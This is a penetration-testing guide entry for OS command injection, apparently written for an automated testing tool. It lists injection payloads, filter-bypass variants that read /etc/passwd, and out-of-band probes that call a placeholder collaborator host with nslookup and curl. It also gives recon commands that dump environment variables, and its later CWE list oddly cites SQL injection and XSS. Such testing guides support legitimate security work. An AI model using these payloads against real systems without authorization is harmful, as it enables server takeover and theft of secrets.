---
id: WSTG-INPV-12
title: Testing for Command Injection
category: Input Validation
severity_range: High-Critical
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
---

# WSTG-INPV-12: Testing for Command Injection

## Summary

Command injection occurs when an application passes user-supplied input to a system shell command. An attacker can inject additional commands to execute arbitrary operations on the server, potentially gaining full system access.

## Test Objectives

- Identify parameters that may be passed to OS commands
- Test if command injection is possible
- Assess the impact and level of access

## Prerequisites

- Target application has functionality that may invoke system commands (file operations, network utilities, PDF generation, image processing)
- Docker pentest container capturing traffic

## Test Steps

### Step 1: Identify Potential Injection Points

**CLI Actions:**
1. Use `curl` to identify functionality that may invoke system commands:
   - File upload/download with server-side processing
   - Ping/traceroute/DNS lookup features
   - PDF/document generation
   - Image processing (resize, convert)
   - Email sending (recipient address)
   - Network diagnostic tools
2. Look for parameters containing filenames, hostnames, or system-related values

### Step 2: Test Basic Command Injection

**CLI Actions:**
Use `curl` to inject command separators:

**Linux targets:**
```
GET /ping?host=127.0.0.1;id HTTP/1.1
GET /ping?host=127.0.0.1|id HTTP/1.1
GET /ping?host=127.0.0.1`id` HTTP/1.1
GET /ping?host=$(id) HTTP/1.1
GET /ping?host=127.0.0.1%0aid HTTP/1.1
```

**Windows targets:**
```
GET /ping?host=127.0.0.1&whoami HTTP/1.1
GET /ping?host=127.0.0.1|whoami HTTP/1.1
GET /ping?host=127.0.0.1&&whoami HTTP/1.1
```

### Step 3: Test Blind Command Injection (Time-Based)

**CLI Actions:**
If no output is visible, use time-based detection with `curl`:

**Linux:**
```
GET /ping?host=127.0.0.1;sleep+5 HTTP/1.1
GET /ping?host=127.0.0.1|sleep+5 HTTP/1.1
GET /ping?host=$(sleep+5) HTTP/1.1
```

**Windows:**
```
GET /ping?host=127.0.0.1|timeout+5 HTTP/1.1
GET /ping?host=127.0.0.1&ping+-n+5+127.0.0.1 HTTP/1.1
```

If response is delayed by ~5 seconds, blind command injection is confirmed.

### Step 4: Test with Out-of-Band Detection

**CLI Actions:**
Use `curl` with DNS-based detection:

```
GET /ping?host=127.0.0.1;nslookup+unique-id.your-collaborator.com HTTP/1.1
GET /ping?host=$(nslookup+unique-id.your-collaborator.com) HTTP/1.1
GET /ping?host=127.0.0.1|curl+http://your-collaborator.com/test HTTP/1.1
```

### Step 5: Assess Impact

If command injection is confirmed:

**CLI Actions:**
Use `curl` to gather information:
```
;id               (current user)
;uname -a         (OS version)
;cat /etc/passwd  (user list)
;env              (environment variables)
;ls -la           (directory listing)
```

**Note:** Only gather information to demonstrate impact. Do not perform destructive actions.

## Payloads

### Command Separators (Linux)
```
;id
|id
`id`
$(id)
;id;
|id|
||id
&&id
%0aid
%0a%0did
```

### Command Separators (Windows)
```
&whoami
|whoami
&&whoami
||whoami
%0awhoami
```

### Blind Detection (Time-Based)
```
;sleep 5
|sleep 5
`sleep 5`
$(sleep 5)
;ping -c 5 127.0.0.1
|timeout 5
&ping -n 5 127.0.0.1
```

### Filter Bypass Payloads
```
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;{cat,/etc/passwd}
;cat</etc/passwd
;c'a't /etc/passwd
;c"a"t /etc/passwd
;c\at /etc/passwd
;/bin/cat /etc/passwd
;$(printf '\x63\x61\x74') /etc/passwd
```

### Encoded Payloads
```
%3bid                  (; id URL encoded)
%7cid                  (| id URL encoded)
%26%26id               (&& id URL encoded)
```

## Detection Criteria

A finding should be logged when:
- Command output is visible in the response
- Time-based delays confirm blind command injection
- Out-of-band interactions (DNS, HTTP) are received
- Error messages reveal command execution attempts

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Full command output visible, running as root/admin | Critical |
| Blind command injection confirmed (time-based or OOB) | Critical |
| Command injection with limited user privileges | High |
| Command execution in a sandboxed/containerized environment | High |
| Error messages suggest command handling but injection not confirmed | Medium |

## Remediation

- Avoid calling OS commands from application code when possible
- Use language-native libraries instead of shell commands (e.g., use socket libraries instead of `ping`)
- If OS commands are necessary, use parameterized APIs that don't invoke a shell
- Apply strict input validation (allowlist of expected characters)
- Never pass user input directly to shell functions (`exec`, `system`, `popen`, backticks)
- Run application processes with minimal privileges
- Implement application-level sandboxing

## References

- [OWASP Testing Guide - Command Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V5 Validation — input handling and parser differentials.
- V12 Files and Resources — upload and inclusion controls.

## CWE references

- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-79: Cross-site Scripting

## Rynix tooling

- Primary tools: ``http_probe``, ``rynix_plugin_run` (template-scan)`, ``record_finding``

## Test focus

- Fuzz parameters with encoding variants (URL, Unicode, double-encoding).
- Switch Content-Type to traverse alternate validators.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

